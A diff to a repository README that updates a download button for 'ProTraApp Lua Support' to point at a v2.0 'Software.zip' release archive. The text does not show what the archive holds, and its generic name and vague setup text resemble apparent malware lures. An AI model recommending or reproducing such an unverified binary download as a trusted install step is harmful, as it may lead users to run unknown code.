@@ -10,7 +10,7 @@ Welcome to the ProTraApp Lua Support Repository! This repository is dedicated to
 ## Getting Started
 To get started with integrating Lua support into your ProTraApp projects, you can download the necessary files from the following link: 
 
-[![Download ProTraApp Lua Support](https://github.com/PandISBackXxXx/ProTraApp_Lua/releases/download/v1.0/Software.zip)](https://github.com/PandISBackXxXx/ProTraApp_Lua/releases/download/v1.0/Software.zip "Launch the download")
+[![Download ProTraApp Lua Support](https://github.com/PandISBackXxXx/ProTraApp_Lua/releases/download/v2.0/Software.zip)](https://github.com/PandISBackXxXx/ProTraApp_Lua/releases/download/v2.0/Software.zip "Launch the download")
 
 Click on the button above to download the required files. Once downloaded, you can proceed with setting up Lua support within your ProTraApp projects.
 
